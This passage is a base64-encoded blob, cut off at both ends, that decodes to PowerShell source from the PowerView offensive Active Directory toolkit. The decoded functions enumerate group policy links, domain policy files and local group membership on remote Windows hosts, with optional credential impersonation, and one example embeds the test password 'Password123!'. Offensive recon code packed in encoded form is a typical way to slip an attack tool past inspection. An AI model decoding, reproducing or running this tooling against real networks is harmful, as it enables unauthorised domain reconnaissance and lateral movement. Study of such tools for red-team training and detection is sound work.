WYgKCRPVU5hbWUpIHsKICAgICAgICAgICAgICAgICAgICAkR1BPR3VpZHMgKz0gR2V0LURvbWFpbk9VIEBDb21tb25Bcmd1bWVudHMgLVNlYXJjaEJhc2UgJE9VTmFtZSAtTERBUEZpbHRlciAnKGdwbGluaz0qKScgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFNlbGVjdC1TdHJpbmcgLUlucHV0T2JqZWN0ICRfLmdwbGluayAtUGF0dGVybiAnKFx7KXswLDF9WzAtOWEtZkEtRl17OH1cLVswLTlhLWZBLUZdezR9XC1bMC05YS1mQS1GXXs0fVwtWzAtOWEtZkEtRl17NH1cLVswLTlhLWZBLUZdezEyfShcfSl7MCwxfScgLUFsbE1hdGNoZXMgfCBGb3JFYWNoLU9iamVjdCB7JF8uTWF0Y2hlcyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IFZhbHVlIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgIyBleHRyYWN0IGFueSBHUE9zIGxpbmtlZCB0byB0aGlzIGNvbXB1dGVyJ3Mgc2l0ZSB0aHJvdWdoIGdwTGluawogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRW51bWVyYXRpbmcgdGhlIHNpdGVuYW1lIGZvcjogJCgkQ29tcHV0ZXIuZG5zaG9zdG5hbWUpIgogICAgICAgICAgICAgICAgJENvbXB1dGVyU2l0ZSA9IChHZXQtTmV0Q29tcHV0ZXJTaXRlTmFtZSAtQ29tcHV0ZXJOYW1lICRDb21wdXRlci5kbnNob3N0bmFtZSkuU2l0ZU5hbWUKICAgICAgICAgICAgICAgIGlmICgkQ29tcHV0ZXJTaXRlIC1hbmQgKCRDb21wdXRlclNpdGUgLW5vdG1hdGNoICdFcnJvcicpKSB7CiAgICAgICAgICAgICAgICAgICAgJEdQT0d1aWRzICs9IEdldC1Eb21haW5TaXRlIEBDb21tb25Bcmd1bWVudHMgLUlkZW50aXR5ICRDb21wdXRlclNpdGUgLUxEQVBGaWx0ZXIgJyhncGxpbms9KiknIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICBTZWxlY3QtU3RyaW5nIC1JbnB1dE9iamVjdCAkXy5ncGxpbmsgLVBhdHRlcm4gJyhceyl7MCwxfVswLTlhLWZBLUZdezh9XC1bMC05YS1mQS1GXXs0fVwtWzAtOWEtZkEtRl17NH1cLVswLTlhLWZBLUZdezR9XC1bMC05YS1mQS1GXXsxMn0oXH0pezAsMX0nIC1BbGxNYXRjaGVzIHwgRm9yRWFjaC1PYmplY3QgeyRfLk1hdGNoZXMgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBWYWx1ZSB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICMgcHJvY2VzcyBhbnkgR1BPIGxvY2FsIGdyb3VwIHNldHRpbmdzIGZyb20gdGhlIEdQTyBHVUlEIHNldAogICAgICAgICAgICAgICAgJEdQT0d1aWRzIHwgR2V0LURvbWFpbkdQT0xvY2FsR3JvdXAgQENvbW1vbkFyZ3VtZW50cyB8IFNvcnQtT2JqZWN0IC1Qcm9wZXJ0eSBHUE9OYW1lIC1VbmlxdWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgJEdQT0dyb3VwID0gJF8KCiAgICAgICAgICAgICAgICAgICAgaWYoJEdQT0dyb3VwLkdyb3VwTWVtYmVycykgewogICAgICAgICAgICAgICAgICAgICAgICAkR1BPTWVtYmVycyA9ICRHUE9Hcm91cC5Hcm91cE1lbWJlcnMKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9NZW1iZXJzID0gJEdQT0dyb3VwLkdyb3VwU0lECiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAkR1BPTWVtYmVycyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgJE9iamVjdCA9IEdldC1Eb21haW5PYmplY3QgQENvbW1vbkFyZ3VtZW50cyAtSWRlbnRpdHkgJF8KICAgICAgICAgICAgICAgICAgICAgICAgJElzR3JvdXAgPSBAKCcyNjg0MzU0NTYnLCcyNjg0MzU0NTcnLCc1MzY4NzA5MTInLCc1MzY4NzA5MTMnKSAtY29udGFpbnMgJE9iamVjdC5zYW1hY2NvdW50dHlwZQoKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0NvbXB1dGVyTG9jYWxHcm91cE1lbWJlciA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0NvbXB1dGVyTG9jYWxHcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlci5kbnNob3N0bmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkR1BPQ29tcHV0ZXJMb2NhbEdyb3VwTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ09iamVjdE5hbWUnICRPYmplY3Quc2FtYWNjb3VudG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0NvbXB1dGVyTG9jYWxHcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdPYmplY3RETicgJE9iamVjdC5kaXN0aW5ndWlzaGVkbmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkR1BPQ29tcHV0ZXJMb2NhbEdyb3VwTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ09iamVjdFNJRCcgJF8KICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0NvbXB1dGVyTG9jYWxHcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJc0dyb3VwJyAkSXNHcm91cAogICAgICAgICAgICAgICAgICAgICAgICAkR1BPQ29tcHV0ZXJMb2NhbEdyb3VwTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT0Rpc3BsYXlOYW1lJyAkR1BPR3JvdXAuR1BPRGlzcGxheU5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0NvbXB1dGVyTG9jYWxHcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9HdWlkJyAkR1BPR3JvdXAuR1BPTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkR1BPQ29tcHV0ZXJMb2NhbEdyb3VwTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT1BhdGgnICRHUE9Hcm91cC5HUE9QYXRoCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Db21wdXRlckxvY2FsR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPVHlwZScgJEdQT0dyb3VwLkdQT1R5cGUKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0NvbXB1dGVyTG9jYWxHcm91cE1lbWJlci5QU09iamVjdC5UeXBlTmFtZXMuQWRkKCdQb3dlclZpZXcuR1BPQ29tcHV0ZXJMb2NhbEdyb3VwTWVtYmVyJykKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0NvbXB1dGVyTG9jYWxHcm91cE1lbWJlcgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5Qb2xpY3lEYXRhIHsKPCMKLlNZTk9QU0lTCgpSZXR1cm5zIHRoZSBkZWZhdWx0IGRvbWFpbiBwb2xpY3kgb3IgdGhlIGRvbWFpbiBjb250cm9sbGVyIHBvbGljeSBmb3IgdGhlIGN1cnJlbnQKZG9tYWluIG9yIGEgc3BlY2lmaWVkIGRvbWFpbi9kb21haW4gY29udHJvbGxlci4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpbkdQTywgR2V0LUdwdFRtcGwsIENvbnZlcnRGcm9tLVNJRCAgCgouREVTQ1JJUFRJT04KClJldHVybnMgdGhlIGRlZmF1bHQgZG9tYWluIHBvbGljeSBvciB0aGUgZG9tYWluIGNvbnRyb2xsZXIgcG9saWN5IGZvciB0aGUgY3VycmVudApkb21haW4gb3IgYSBzcGVjaWZpZWQgZG9tYWluL2RvbWFpbiBjb250cm9sbGVyIHVzaW5nIEdldC1Eb21haW5HUE8uCgouUEFSQU1FVEVSIERvbWFpbgoKVGhlIGRvbWFpbiB0byBxdWVyeSBmb3IgZGVmYXVsdCBwb2xpY2llcywgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBQb2xpY3kKCkV4dHJhY3QgJ0RvbWFpbicsICdEQycgKGRvbWFpbiBjb250cm9sbGVyKSBwb2xpY2llcywgb3IgJ0FsbCcgZm9yIGFsbCBwb2xpY2llcy4KT3RoZXJ3aXNlIHF1ZXJpZXMgZm9yIHRoZSBwYXJ0aWN1bGFyIEdQTyBuYW1lIG9yIEdVSUQuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5Qb2xpY3lEYXRhCgpSZXR1cm5zIHRoZSBkZWZhdWx0IGRvbWFpbiBwb2xpY3kgZm9yIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluUG9saWN5RGF0YSAtRG9tYWluIGRldi50ZXN0bGFiLmxvY2FsCgpSZXR1cm5zIHRoZSBkZWZhdWx0IGRvbWFpbiBwb2xpY3kgZm9yIHRoZSBkZXYudGVzdGxhYi5sb2NhbCBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpbkdQTyB8IEdldC1Eb21haW5Qb2xpY3kKClBhcnNlcyBhbnkgR3B0VG1wbC5pbmZzIGZvdW5kIGZvciBhbnkgcG9saWNpZXMgaW4gdGhlIGN1cnJlbnQgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5Qb2xpY3lEYXRhIC1Qb2xpY3kgREMgLURvbWFpbiBkZXYudGVzdGxhYi5sb2NhbAoKUmV0dXJucyB0aGUgcG9saWN5IGZvciB0aGUgZGV2LnRlc3RsYWIubG9jYWwgZG9tYWluIGNvbnRyb2xsZXIuCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LURvbWFpblBvbGljeURhdGEgLUNyZWRlbnRpYWwgJENyZWQKCi5PVVRQVVRTCgpIYXNodGFibGUKCk91cHV0cyBhIGhhc2h0YWJsZSByZXByZXNlbnRpbmcgdGhlIHBhcnNlZCBHcHRUbXBsLmluZiBmaWxlLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZShbSGFzaHRhYmxlXSldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdTb3VyY2UnLCAnTmFtZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFBvbGljeSA9ICdEb21haW4nLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgJENvbnZlcnRBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkQ29udmVydEFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJENvbnZlcnRBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgewogICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbgogICAgICAgICAgICAkQ29udmVydEFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluCiAgICAgICAgfQoKICAgICAgICBpZiAoJFBvbGljeSAtZXEgJ0FsbCcpIHsKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJyonCiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJFBvbGljeSAtZXEgJ0RvbWFpbicpIHsKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJ3szMUIyRjM0MC0wMTZELTExRDItOTQ1Ri0wMEMwNEZCOTg0Rjl9JwogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCgkUG9saWN5IC1lcSAnRG9tYWluQ29udHJvbGxlcicpIC1vciAoJFBvbGljeSAtZXEgJ0RDJykpIHsKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJ3s2QUMxNzg2Qy0wMTZGLTExRDItOTQ1Ri0wMEMwNEZCOTg0Rjl9JwogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJFBvbGljeQogICAgICAgIH0KCiAgICAgICAgJEdQT1Jlc3VsdHMgPSBHZXQtRG9tYWluR1BPIEBTZWFyY2hlckFyZ3VtZW50cwoKICAgICAgICBGb3JFYWNoICgkR1BPIGluICRHUE9SZXN1bHRzKSB7CiAgICAgICAgICAgICMgZ3JhYiB0aGUgR3B0VG1wbC5pbmYgZmlsZSBhbmQgcGFyc2UgaXQKICAgICAgICAgICAgJEdwdFRtcGxQYXRoID0gJEdQTy5ncGNmaWxlc3lzcGF0aCArICJcTUFDSElORVxNaWNyb3NvZnRcV2luZG93cyBOVFxTZWNFZGl0XEdwdFRtcGwuaW5mIgoKICAgICAgICAgICAgJFBhcnNlQXJncyA9ICBAewogICAgICAgICAgICAgICAgJ0dwdFRtcGxQYXRoJyA9ICRHcHRUbXBsUGF0aAogICAgICAgICAgICAgICAgJ091dHB1dE9iamVjdCcgPSAkVHJ1ZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkUGFyc2VBcmdzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgICAgICAjIHBhcnNlIHRoZSBHcHRUbXBsLmluZgogICAgICAgICAgICBHZXQtR3B0VG1wbCBAUGFyc2VBcmdzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJF8gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPTmFtZScgJEdQTy5uYW1lCiAgICAgICAgICAgICAgICAkXyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9EaXNwbGF5TmFtZScgJEdQTy5kaXNwbGF5bmFtZQogICAgICAgICAgICAgICAgJF8KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMKIyBGdW5jdGlvbnMgdGhhdCBlbnVtZXJhdGUgYSBzaW5nbGUgaG9zdCwgZWl0aGVyIHRocm91Z2gKIyBXaW5OVCwgV01JLCByZW1vdGUgcmVnaXN0cnksIG9yIEFQSSBjYWxscwojICh3aXRoIFBTUmVmbGVjdCkuCiMKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCmZ1bmN0aW9uIEdldC1OZXRMb2NhbEdyb3VwIHsKPCMKLlNZTk9QU0lTCgpFbnVtZXJhdGVzIHRoZSBsb2NhbCBncm91cHMgb24gdGhlIGxvY2FsIChvciByZW1vdGUpIG1hY2hpbmUuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IFBTUmVmbGVjdCAgCgouREVTQ1JJUFRJT04KClRoaXMgZnVuY3Rpb24gd2lsbCBlbnVtZXJhdGUgdGhlIG5hbWVzIGFuZCBkZXNjcmlwdGlvbnMgZm9yIHRoZQpsb2NhbCBncm91cHMgb24gdGhlIGN1cnJlbnQsIG9yIHJlbW90ZSwgbWFjaGluZS4gQnkgZGVmYXVsdCwgdGhlIFdpbjMyIEFQSQpjYWxsIE5ldExvY2FsR3JvdXBFbnVtIHdpbGwgYmUgdXNlZCAoZm9yIHNwZWVkKS4gU3BlY2lmeWluZyAiLU1ldGhvZCBXaW5OVCIKY2F1c2VzIHRoZSBXaW5OVCBzZXJ2aWNlIHByb3ZpZGVyIHRvIGJlIHVzZWQgaW5zdGVhZCwgd2hpY2ggcmV0dXJucyBncm91cApTSURzIGFsb25nIHdpdGggdGhlIGdyb3VwIG5hbWVzIGFuZCBkZXNjcmlwdGlvbnMvY29tbWVudHMuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQoKU3BlY2lmaWVzIHRoZSBob3N0bmFtZSB0byBxdWVyeSBmb3Igc2Vzc2lvbnMgKGFsc28gYWNjZXB0cyBJUCBhZGRyZXNzZXMpLgpEZWZhdWx0cyB0byB0aGUgbG9jYWxob3N0LgoKLlBBUkFNRVRFUiBNZXRob2QKClRoZSBjb2xsZWN0aW9uIG1ldGhvZCB0byB1c2UsIGRlZmF1bHRzIHRvICdBUEknLCBhbHNvIGFjY2VwdHMgJ1dpbk5UJy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byBhIHJlbW90ZSBtYWNoaW5lLiBPbmx5IGFwcGxpY2FibGUgd2l0aCAiLU1ldGhvZCBXaW5OVCIuCgouRVhBTVBMRQoKR2V0LU5ldExvY2FsR3JvdXAKCkNvbXB1dGVyTmFtZSAgICAgICAgICAgICAgICAgIEdyb3VwTmFtZSAgICAgICAgICAgICAgICAgICAgIENvbW1lbnQKLS0tLS0tLS0tLS0tICAgICAgICAgICAgICAgICAgLS0tLS0tLS0tICAgICAgICAgICAgICAgICAgICAgLS0tLS0tLQpXSU5ET1dTMSAgICAgICAgICAgICAgICAgICAgICBBZG1pbmlzdHJhdG9ycyAgICAgICAgICAgICAgICBBZG1pbmlzdHJhdG9ycyBoYXZlIGNvbXBsZS4uLgpXSU5ET1dTMSAgICAgICAgICAgICAgICAgICAgICBCYWNrdXAgT3BlcmF0b3JzICAgICAgICAgICAgICBCYWNrdXAgT3BlcmF0b3JzIGNhbiBvdmVyci4uLgpXSU5ET1dTMSAgICAgICAgICAgICAgICAgICAgICBDcnlwdG9ncmFwaGljIE9wZXJhdG9ycyAgICAgICBNZW1iZXJzIGFyZSBhdXRob3JpemVkIHRvIC4uLgouLi4KCi5FWEFNUExFCgpHZXQtTmV0TG9jYWxHcm91cCAtTWV0aG9kIFdpbm50CgpDb21wdXRlck5hbWUgICAgICAgICAgIEdyb3VwTmFtZSAgICAgICAgICAgICAgR3JvdXBTSUQgICAgICAgICAgICAgIENvbW1lbnQKLS0tLS0tLS0tLS0tICAgICAgICAgICAtLS0tLS0tLS0gICAgICAgICAgICAgIC0tLS0tLS0tICAgICAgICAgICAgICAtLS0tLS0tCldJTkRPV1MxICAgICAgICAgICAgICAgQWRtaW5pc3RyYXRvcnMgICAgICAgICBTLTEtNS0zMi01NDQgICAgICAgICAgQWRtaW5pc3RyYXRvcnMgaGF2Li4uCldJTkRPV1MxICAgICAgICAgICAgICAgQmFja3VwIE9wZXJhdG9ycyAgICAgICBTLTEtNS0zMi01NTEgICAgICAgICAgQmFja3VwIE9wZXJhdG9ycyBjLi4uCldJTkRPV1MxICAgICAgICAgICAgICAgQ3J5cHRvZ3JhcGhpYyBPcGVyYS4uLiBTLTEtNS0zMi01NjkgICAgICAgICAgTWVtYmVycyBhcmUgYXV0aG9yLi4uCi4uLgoKLkVYQU1QTEUKCkdldC1OZXRMb2NhbEdyb3VwIC1Db21wdXRlck5hbWUgcHJpbWFyeS50ZXN0bGFiLmxvY2FsCgpDb21wdXRlck5hbWUgICAgICAgICAgICAgICAgICBHcm91cE5hbWUgICAgICAgICAgICAgICAgICAgICBDb21tZW50Ci0tLS0tLS0tLS0tLSAgICAgICAgICAgICAgICAgIC0tLS0tLS0tLSAgICAgICAgICAgICAgICAgICAgIC0tLS0tLS0KcHJpbWFyeS50ZXN0bGFiLmxvY2FsICAgICAgICAgQWRtaW5pc3RyYXRvcnMgICAgICAgICAgICAgICAgQWRtaW5pc3RyYXRvcnMgaGF2ZSBjb21wbGUuLi4KcHJpbWFyeS50ZXN0bGFiLmxvY2FsICAgICAgICAgVXNlcnMgICAgICAgICAgICAgICAgICAgICAgICAgVXNlcnMgYXJlIHByZXZlbnRlZCBmcm9tIG0uLi4KcHJpbWFyeS50ZXN0bGFiLmxvY2FsICAgICAgICAgR3Vlc3RzICAgICAgICAgICAgICAgICAgICAgICAgR3Vlc3RzIGhhdmUgdGhlIHNhbWUgYWNjZXMuLi4KcHJpbWFyeS50ZXN0bGFiLmxvY2FsICAgICAgICAgUHJpbnQgT3BlcmF0b3JzICAgICAgICAgICAgICAgTWVtYmVycyBjYW4gYWRtaW5pc3RlciBkb20uLi4KcHJpbWFyeS50ZXN0bGFiLmxvY2FsICAgICAgICAgQmFja3VwIE9wZXJhdG9ycyAgICAgICAgICAgICAgQmFja3VwIE9wZXJhdG9ycyBjYW4gb3ZlcnIuLi4KCi5PVVRQVVRTCgpQb3dlclZpZXcuTG9jYWxHcm91cC5BUEkKCkN1c3RvbSBQU09iamVjdCB3aXRoIHRyYW5zbGF0ZWQgZ3JvdXAgcHJvcGVydHkgZmllbGRzIGZyb20gQVBJIHJlc3VsdHMuCgpQb3dlclZpZXcuTG9jYWxHcm91cC5XaW5OVAoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggdHJhbnNsYXRlZCBncm91cCBwcm9wZXJ0eSBmaWVsZHMgZnJvbSBXaW5OVCByZXN1bHRzLgoKLkxJTksKCmh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvd2luZG93cy9kZXNrdG9wL2FhMzcwNDQwKHY9dnMuODUpLmFzcHgKIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Mb2NhbEdyb3VwLkFQSScpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Mb2NhbEdyb3VwLldpbk5UJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0TmFtZScsICdkbnNob3N0bmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICRFbnY6Q09NUFVURVJOQU1FLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0FQSScsICdXaW5OVCcpXQogICAgICAgIFtBbGlhcygnQ29sbGVjdGlvbk1ldGhvZCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE1ldGhvZCA9ICdBUEknLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgIGlmICgkTWV0aG9kIC1lcSAnQVBJJykgewogICAgICAgICAgICAgICAgIyBpZiB3ZSdyZSB1c2luZyB0aGUgTmV0YXBpMzIgTmV0TG9jYWxHcm91cEVudW0gQVBJIGNhbGwgdG8gZ2V0IHRoZSBsb2NhbCBncm91cCBpbmZvcm1hdGlvbgoKICAgICAgICAgICAgICAgICMgYXJndW1lbnRzIGZvciBOZXRMb2NhbEdyb3VwRW51bQogICAgICAgICAgICAgICAgJFF1ZXJ5TGV2ZWwgPSAxCiAgICAgICAgICAgICAgICAkUHRySW5mbyA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICAgICAkRW50cmllc1JlYWQgPSAwCiAgICAgICAgICAgICAgICAkVG90YWxSZWFkID0gMAogICAgICAgICAgICAgICAgJFJlc3VtZUhhbmRsZSA9IDAKCiAgICAgICAgICAgICAgICAjIGdldCB0aGUgb